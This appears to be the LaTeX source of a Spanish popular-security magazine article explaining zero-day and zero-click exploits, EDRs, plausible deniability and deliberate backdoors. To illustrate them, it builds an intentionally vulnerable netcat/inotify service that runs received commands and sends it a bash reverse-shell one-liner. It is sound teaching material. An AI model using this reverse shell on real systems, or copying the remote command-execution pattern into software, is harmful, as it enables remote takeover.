@@ -1,0 +1,447 @@
+\hypertarget{seguridad:zero1}{}\label{seguridad:zero}
+
+\pagestyle{seguridad}
+
+\rput(7.9,-4.5){\resizebox{!}{17cm}{{\epsfbox{images/articulos/security_header.eps}}}}
+
+\vspace{6cm}
+
+\psset{fillstyle=solid}
+\psframe[fillcolor=black,opacity=0.7](2,-4.5)(17,0)
+
+
+
+% -------------------------------------------------
+% Cabecera
+\begin{flushright}
+
+
+{\color{introcolor}\mtitle{14cm}{SEGURIDAD PARA MEROS MORTALES}}
+
+\msubtitle{8cm}{Doble cero, con licencia para Hackear}
+
+{\sf\color{white}{ por Andrés ``Andy'' Pajuaker}}
+
+%{{\psset{linecolor=black,linestyle=dotted}\psline(-12,0)}}
+\end{flushright}
+
+
+\vspace{2mm}
+% -------------------------------------------------
+
+
+%\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\footnotesize}
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+
+
+
+\intro{introcolor}{V}{ale, me he venido muy arriba con el titulo pero no he podido evitarlo.
+LoL. Dejando a un lado lo cómico que puede sonar, realmente el título es
+bastante apropiado. Ya hablamos de los \emph{Zero Days} en un artículo
+anterior y en esta ocasión vamos a ver que pasa cuando los combinamos
+con los denominados \emph{Zero Clicks}.}
+
+
+\begin{multicols}{2}
+
+
+A modo de recordatorio, en el mundo de la seguridad informática, un
+\emph{Zero Day} es una vulnerabilidad explotable que todavía no es
+pública. De hecho, el término se aplica normalmente al \emph{exploit}
+que usa esa vulnerabilidad para evitar algún tipo de sistema de
+seguridad. Para los más despistados, los \emph{exploits} son programas
+que abusan algún tipo de error en otros programas (vulnerabilidades)
+para conseguir hacer algo que en general no esta permitido.
+
+Si quieres leer más sobre todo esto te recomendamos nuestro artículo:
+
+\href{https://ibolcode.net/roor/2018-07-seguridad-para-meros-mortales--exploits}{Seguridad
+para Meros Mortales. Exploits},
+
+donde os explicamos todos estos
+conceptos en mucho más detalle.
+
+\hypertarget{one-click-exploits}{%
+\sectiontext{white}{black}{ONE CLICK EXPLOITS}\label{one-click-exploits}}
+
+La mayoría de las brechas de seguridad requieren que el usuario realice
+alguna acción. Lo más habitual es engañarlo para que pulse un
+determinado enlace, o ejecute algún programa que se haya descargado de
+algún sitio de dudosa reputación en Internet. Técnicas como el Phishing
+o Spear Phishing son los métodos más habituales.
+
+A veces también se abusa de la curiosidad humana. Un atacante malicioso
+puede dejar una memoria USB con software malicioso en algún lugar en el
+que la víctima lo pueda encontrar. Es muy probable que la víctima
+directamente conecte el USB a su ordenador para \emph{ver que tiene}.
+Una vez que ha hecho eso, todo tipo de cosas malas pueden ocurrir.
+Ficheros que parecen imágenes pueden contener malware, o documentos
+pueden ejecutar malware al ser abiertos, o incluso el USB no es una
+memoria sino un teclado virtual y puede escribir el malware ante tus
+propios ojos.
+
+Teniendo esto en cuenta podemos definir los primeros Mandamientos de los
+Usuarios seguros:
+
+\begin{itemize}
+
+\item
+  No pincharás en enlaces desconocidos.
+\item
+  No pincharás memorias USB de origen desconocido.
+\item
+  No ejecutarás programas de dudosa procedencia.
+\item
+  No abrirás documentos de origen desconocido.
+\item
+  No asumirás que los mensajes proceden de quien dicen proceder.
+\end{itemize}
+
+Siguiendo estos mandamientos estaremos bastante seguros, sin embargo, es
+posible que alguien que conocemos haya sido hackeado y documentos
+enviados por esa persona estén infectados. En ese caso debemos añadir un
+nuevo mandamiento.
+
+\begin{itemize}
+
+\item
+  Mantendrás tu sistema y antivirus actualizado
+\item
+  Nunca ejecutarás programas como Administrador
+\end{itemize}
+
+Bueno, siguiendo estos mandamientos la mayoría de nosotros estaremos
+bastante a salvo. De hecho, podríamos pensar que si no pulsamos en
+absolutamente nada que recibamos a través de fuentes externas estaríamos
+a salvo.¿Verdad?\ldots{} Pues no.
+
+\hypertarget{zero-click}{%
+\sectiontext{white}{black}{ZERO CLICKS}\label{zero-click}}
+
+Los ordenadores hoy en dia hacen un montón de cosas por nosotros. Cuanto
+más \emph{fácil de usar}, normalmente más cosas hace por nosotros, lo
+que significa que hay muchos programas que están siendo ejecutados por
+el ordenador todo el tiempo, muchos de ellos procesando datos que
+provienen del exterior.
+
+Por ejemplo, pensad en vuestra aplicación de mensajería preferida.
+Cuando recibís un mensaje, la mayoría de vosotros veréis una
+notificación en la que aparecen las primeras líneas del mensaje
+recibido\ldots{} Eso es exactamente lo mismo que \emph{pinchar} en algo.
+En este caso pinchar en el mensaje recibido. El programa de notificación
+tiene que abrir y procesar el mensaje para poder mostrarlo.
+
+\begin{entradilla}
+{\em Algunos exploits se pueden ejecutar sin que el usuario realice ninguna acción. Son los ZERO-CLICKS}
+\end{entradilla}
+
+Si el código que lee el mensaje para mostrar la notificación tiene una
+vulnerabilidad, un atacante podría enviar un mensaje malicioso que
+explotase esa vulnerabilidad y le diera acceso al dispositivo de alguna
+forma\ldots. Y en ese caso no habríamos pulsado nada.
+
+Este tipo de ataques se conocen como \emph{Zero Click} es decir, se
+ejecutan de forma automática junto con tareas normales del sistema sin
+que el usuario tenga que hacer absolutamente nada, lo cual es
+super-inquietante ya que esto significa que cualquier dispositivo puede
+ser hackeado remotamente sin que el usuario se entere en absoluto. Da
+miedito.
+
+\hypertarget{doble-zero}{%
+\sectiontext{white}{black}{DOBLE ZERO}\label{doble-zero}}
+
+Como os podéis imaginar, un ataque \emph{Zero Click} que además es un
+\emph{Zero Day} es algo tremendamente valioso, por el que ciertas
+organizaciones pagarían grandes cantidades de dinero. Básicamente esto
+significa que cualquier dispositivo puede ser hackeado en cualquier
+momento sin que su propietario se entere de nada. Bueno, cualquier
+dispositivo que ejecute el programa con el \emph{Zero day} y el
+\emph{Zero Click}.
+
+El famoso malware
+\href{https://en.wikipedia.org/wiki/Pegasus_(spyware)}{\emph{Pegasus}}
+utilizado por gobiernos de todo el mundo para espíar a distintos
+ciudadanos (criminales y no) usaba varios de estos doble ceros, razón
+por la cual su precio era tan elevado.
+
+Debemos entender que lo realmente valioso es la combinación de estos dos
+casos. Un \emph{Zero Click} que es conocido, muy probablemente será
+parcheado y si nuestro sistema se actualiza regularmente, muy
+probablemente no será un problema para nosotros. Pero cuando además es
+un \emph{Zero Day}, nadie sabe que existe, así que nadie está intentando
+arreglarlo, con lo cual es indetectable.
+
+Para entender como funciona todo esto vamos a hacer un ejemplo muy
+sencillo a modo de ilustración.
+
+\hypertarget{un-servicio-vulnerable}{%
+\sectiontext{white}{black}{UN SERVICIO VULNERABLE}\label{un-servicio-vulnerable}}
+
+Vamos a crear un servicio vulnerable con un \emph{Zero Click} del copón.
+El servicio mola bastante. Cualquiera puede escribir una serie de
+comandos en un determinado fichero y el servicio ejecutará el comando y
+nos mostrará el resultado en una notificación en el escritorio. Así, por
+ejemplo podemos recibir una notificación cuando nuestra descarga o
+nuestra compilación finaliza\ldots. Mola que no?
+
+De hecho, esto lo podemos implementar en una sola línea usando el
+servicio {\verb!inotify!} del kernel. Para ello debemos
+instalar el paquete:
+
+\begin{lstlisting}
+sudo apt install inotify-tools
+\end{lstlisting}
+
+Una vez instalados, solo tenemos que ejecutar esta línea:
+
+\begin{lstlisting}
+$ while inotifywait -e close_write /tmp/cmd; \
+> do notify-send RESULT "`. /tmp/cmd`"; done 
+\end{lstlisting}
+
+El programa {\verb!inotifywait!} nos avisará cada vez
+que se escriba algo en el fichero {\verb!/tmp/cmd!}. De
+ser así usará {\verb!notify-send!} para mostrar una
+notificación en el escritorio con el resultado de la ejecución de lo que
+sea que hayamos escrito en {\verb!/tmp/cmd!}
+
+Así, simplemente haciendo algo como esto:
+
+\begin{lstlisting}
+$ echo "echo Hello World" > /tmp/cmd
+\end{lstlisting}
+
+Mostrará ese mensaje {\verb!Hello World!} en un pop-up
+en pantalla. O:
+
+\begin{lstlisting}
+$ echo "wget https://servidor.com/ficheroguay.tgz \
+        && echo 'Descarga Finalizada'" > /tmp/cmd
+\end{lstlisting}
+
+Ahora vamos a convertir esto en un servicio de notificaciones remotas.
+Para ello, en otra consola vamos a ejecutar el siguiente comando:
+
+\begin{lstlisting}[language=bash]
+$ while true; do nc -lvp 4444 > /tmp/cmd; sync; done
+\end{lstlisting}
+
+Esta línea ejecuta en un bucle infinito una instancia de netcat que
+volcará lo que reciba de la red en {\verb!/tmp/cmd!}
+para que sea ejecutado por nuestro servicio. Hemos tenido que usar
+{\verb!sync!} para asegurarnos que el fichero se ha
+actualizado en el disco cuando {\verb!inotifywait!}
+recibe el evento.
+
+Ahora podemos ejecutar comandos de forma remota de esta guisa:
+
+\begin{lstlisting}
+$ echo "echo 'Hello Wolrd'" | nc -N  localhost 4444
+\end{lstlisting}
+
+\columnbreak
+
+\hypertarget{un-exploit}{%
+\sectiontext{white}{black}{UN EXPLOIT}\label{un-exploit}}
+
+Ya disponemos de un servicio vulnerable. Ahora veamos como explotarlo,
+lo cual es tremendamente sencillo, ya que el servicio en si nos permite
+la ejecución remota de comandos. Para comprobarlo, en un nuevo terminal,
+o incluso en una máquina distinta, vamos a lanzar un \emph{Netcat} en
+modo servidor con la línea:
+
+\begin{lstlisting}
+$ nc -lvp 5555
+\end{lstlisting}
+
+Si, ahora mandamos la siguiente línea a nuestro servicio de ejecución
+remota
+
+\begin{lstlisting}
+$ echo "(bash -i >& /dev/tcp/127.0.0.1/5555 0>&1)&" \
+> | nc -N localhost 4444
+\end{lstlisting}
+
+Obtendremos en la primera ventana una shell a la máquina remota. Si
+estás haciendo esto en la misma máquina, puede resultar confuso y
+parecer que no ha ocurrido nada. Para que no haya dudas lo mejor es que
+ejecutes el servidor netcat como un usuario distinto, de forma que
+puedas verificar que, una vez envías el mensaje de arriba, la shell que
+obtenemos en Netcat es la del usuario que ejecutar el servicio, es
+decir, el pequeño bucle que espera notificaciones y ejecuta el script.
+
+
+La línea que enviamos se conoce como un \emph{Reverse Shell} o
+\emph{Shell Inverso} ya que la máquina a la que queremos acceder es la
+que inicia la conexión. La línea usa la capacidad de {\verb!bash!} de establecer conexiones TCP usando {\verb!/dev/tcp/IP/port!}. Una vez creada la conexión simplemente redirigimos las entradas y salidas. El primer {\verb!>&!} duplica {\verb!stdout!} y{\verb!stderr!} para que apunten al socket. El {\verb!0>&1!} hace que {\verb!stdin!} (0) apunte al descriptor de fichero 1 que en este caso es el socket. En otras palabras {\verb!bash!} deja de escribir y leer de
+la consola y ahora lo hará en el socket, es decir, en la conexión TCP.
+
+\begin{entradilla}
+{\em BASH nos permite hacer conexiones de red y lanzar Reverse Shell en una sola línea}
+\end{entradilla}
+
+Como podéis ver, esto, además de una cagada monumental de servicio, es
+un \emph{Zero Click}. Sin que el usuario realice ninguna acción, un
+atacante puede obtener acceso shell a la máquina simplemente enviando un
+mensaje malicioso. En estos casos no hay mucho que hacer más allá de
+esperar por una nueva versión del desarrollador que arregle el problema
+o dejar de usar el servicio. Bueno, si se trata de Software libre
+siempre tendremos la tercera opción de corregir el problema nosotros
+mismos :).
+
+\hypertarget{detecciuxf3n.-edrs}{%
+\sectiontext{white}{black}{DETECCIÓN. EDRs}\label{detecciuxf3n.-edrs}}
+
+El caso de los \emph{Zero Click} es especialmente complicado ya que el
+usuario al que afectan no hace nada mal. Puede seguir todas las normas
+de seguridad recomendadas a rajatabla y aún así ser infectado por algún
+tipo de malware.
+
+Lo que tenemos que tener claro que se trata de un tipo de bug, no de un
+malware directamente. Lo que esto significa es que, el \emph{Zero Click}
+es la forma que utilizará un atacante para instalar un determinado
+Malware. Si el Malware que instalan es conocido, tu antivirus
+probablemente lo detecte y en caso de que utilice la red, una buena
+configuración del firewall podrá limitar los daños que pudiera causar.
+
+Si el Malware no es conocido, la única forma de plantar cara a esta
+situación es utilizar algunos de los elementos comunes en los
+denominados EDR \emph{End Point Detection and Response} o
+\emph{Detección y Respuesta de punto final}. Estos sistemas intentan
+identificar comportamientos sospechosos y bloquearlos. La gran ventaja
+de estos sistemas es que son capaces de detectar malware desconocido
+simplemente analizando lo que hacen, sin embargo las desventajas son
+varias.
+\begin{entradilla}
+{\em Los EDR (End-Point Detection and Response) permiten detectar algunas de estas amenazas cuando están ocurriendo.}
+\end{entradilla}
+
+
+La primera y más importante es que hacer eso requiere monitorizar un
+montón de cosas y eso tiene un coste en el rendimiento del sistema. La
+segunda es que el sistema, especialmente hasta que se ajusta a las
+necesidades de sus usuarios, puede producir muchos falsos positivos que
+pueden hacer muy frustrante el uso de la máquina.
+
+
+Debido a estas razones estos sistemas solo se suelen utilizar en
+entornos corporativos en los que hay un gran número de máquinas y los
+análisis y reglas en cada una de ellas se pueden fácilmente trasladar al
+resto que se beneficia inmediatamente de esos resultados. Además, en
+estos entornos es más fácil imponer condiciones mucho más restrictivas
+que permiten mantener el sistema más seguro, muchas veces a costa de
+limitar su usabilidad.
+
+Los EDRs se pueden ver como un sistema de adquisición y fusión de datos
+procedentes de distintas aplicaciones como por ejemplo, \emph{Sandboxes}
+o máquinas virtuales en las que se ejecuta cierto software para
+verificar si realiza algo malicioso, antivirus que utilizan tanto
+escaneo de signaturas de ficheros como técnicas de análisis heurístico
+para determinar si cierto programa es peligroso, firewalls, sistemas de
+back-up\ldots{} etc\ldots{}
+
+A un nivel más doméstico el activar el análisis heuristico del antivirus
+puede ayudar, si bien, como ya dijimos, se va a notar en el rendimiento
+de la máquina.
+
+Resumiendo, no está todo perdido si existe un \emph{Zero Click} en
+nuestra máquina, aunque su prevención tiene un coste. Lo negativo es que
+la mayoría de los usuarios no estamos dispuestos a pagar ese coste.
+
+\end{multicols}
+\pagebreak
+\begin{multicols}{2}
+
+\hypertarget{denegaciuxf3n-plausible}{%
+\sectiontext{white}{black}{DENEGACIÓN PLAUSIBLE}\label{denegaciuxf3n-plausible}}
+
+Si bien, este tipo de vulnerabilidades (los \emph{Doble Zero}) se supone
+que son fruto de algún tipo de error en el desarrollo del software, nada
+impide que todo esto se haga a propósito como una forma de obtener
+acceso a los sistemas en los que se instale ese \emph{Software}, o al
+propio Software. En ese caso, no es posible decidir sin lugar a dudas si
+la vulnerabilidad ha sido un error en el programa o ha sido puesta a
+propósito para permitir a terceras partes hacer cosas feas.
+
+Esta situación se conoce como \emph{Denegación Plausible}. Si la entidad
+haciendo esto dice que no lo ha hecho a propósito, vamos, que no tenía
+ni idea de que el bug estuviera allí, no hay forma de saber si dice la
+verdad o no, y en esas circunstancias no puede ser acusada de ninguna
+actividad ilegal. No ha sido más que un inocente error y en el peor de
+los casos, tendrán que pagar una indemnización a los afectados.
+
+\begin{entradilla}
+{\em Las técnicas esteganográficas son un ejemplo de denegación plausible}
+\end{entradilla}
+
+
+Este concepto se utiliza también con el almacenamiento de datos
+cifrados. En concreto las técnicas esteganográficas (No te pierdas
+\href{https://ibolcode.net/roor/2016-09-mensajes-clandestinos}{este
+artículo} si es que no lo has leído ya) son una forma de denegación
+plausible puesto que no se puede probar que una imagen (por ejemplo)
+contenga un mensaje cifrado o no\ldots{} bueno, hay que hacerlo con
+cierto cuidado, pero si las técnicas se aplican correctamente es
+perfectamente factible negar que existe un mensaje cifrado dentro de la
+imagen, y la persona cuestionando esa afirmación no tendrá forma de
+probar que si lo hay.
+
+
+Otra forma de denegación plausible que utilizan algunos sistemas de
+cifrado de disco es el anidamiento de unidades cifradas. El sistema de
+cifrado crea una unidad virtual de almacenamiento cifrada. Cualquier
+Software decente de cifrado inicializará la unidad cifrada con valores
+aleatorios, de forma que no sea posible inferir cuanta información está
+almacenada en esa unidad. Pues bien, si dentro de una de estas unidades
+cifradas, almacenamos otra unidad cifrada (en el espacio libre de la
+primera), no es posible detectar la existencia de la segunda unidad.
+
+En estos casos, el dueño del sistema de almacenamiento, un disco por
+ejemplo, puede, bajo coacción, compartir la clave del primer sistema y
+comprometer cierta información. Sin embargo, no existe ninguna evidencia
+de que el \emph{espacio libre} en la unidad cifrase contenga ningún otro
+tipo de datos. La idea principal es que, una vez que has dado la
+información para acceder a la información secreta, la entidad que quiere
+obtenerla asumirá que ya la tiene y no buscará más.
+
+\hypertarget{puertas-traseras}{%
+\sectiontext{white}{black}{PUERTAS TRASERAS}\label{puertas-traseras}}
+
+Como adelantamos en una sección anterior, este tipo de \emph{errores}
+constituyen la forma más sencilla y segura de implementar puertas
+traseras en Software. No existe ninguna evidencia de un problema a
+priori, y la puerta trasera estará disponible mientras nadie se percate
+de su existencia. Es lo que podríamos llamar: \emph{Plantar un Zero
+Day}.
+
+Cuando hablamos de software propietario cuyo código fuente no está
+disponible, la detección de este tipo de bugs puede llevar años durante
+los cuales ciertas partes dispondrán de acceso libre a todos los
+usuarios de ese software. Si ese software no es el más popular del
+mundo, el proceso de detección de esos bugs puede alargarse incluso más.
+
+\begin{entradilla}
+{\em La forma más efectica de esconder una puerta trasera es incluir un bug en el software}
+\end{entradilla}
+
+Esto es algo conocido. Tan conocido que existe un concurso conocido,
+valga la redundancia, como
+\href{https://en.wikipedia.org/wiki/Underhanded_C_Contest}{\emph{Underhanded
+C contest}} o Concurso\_ de C Engañoso\_ en el que el objetivo es
+producir programas que pasen una inspección rigurosa pero que permita
+realizar algo malicioso de tal forma que, una vez descubierto el engaño
+este parezca un error honesto del programador. Si es que está todo
+inventado :).
+
+\hypertarget{conclusiones}{%
+\sectiontext{white}{black}{CONCLUSIONES}\label{conclusiones}}
+
+Bueno esto es lo que os quería contar. Espero que ahora tengáis más
+claro que es un \emph{Zero Click} y porque son tan peligrosos. Que tus
+sistemas pueden ser infectados incluso sin hacer nada mal. Que es la
+denegación plausible y como las compañías pueden añadir puertas traseras
+en el Software de forma legal sin que nadie lo separa durante largos
+periodos de tiempo. \EOP
+\end{multicols}
+
+\rput(8.0,-2.0){\resizebox{!}{4.2cm}{{\epsfbox{images/promo/promo-sol.eps}}}}
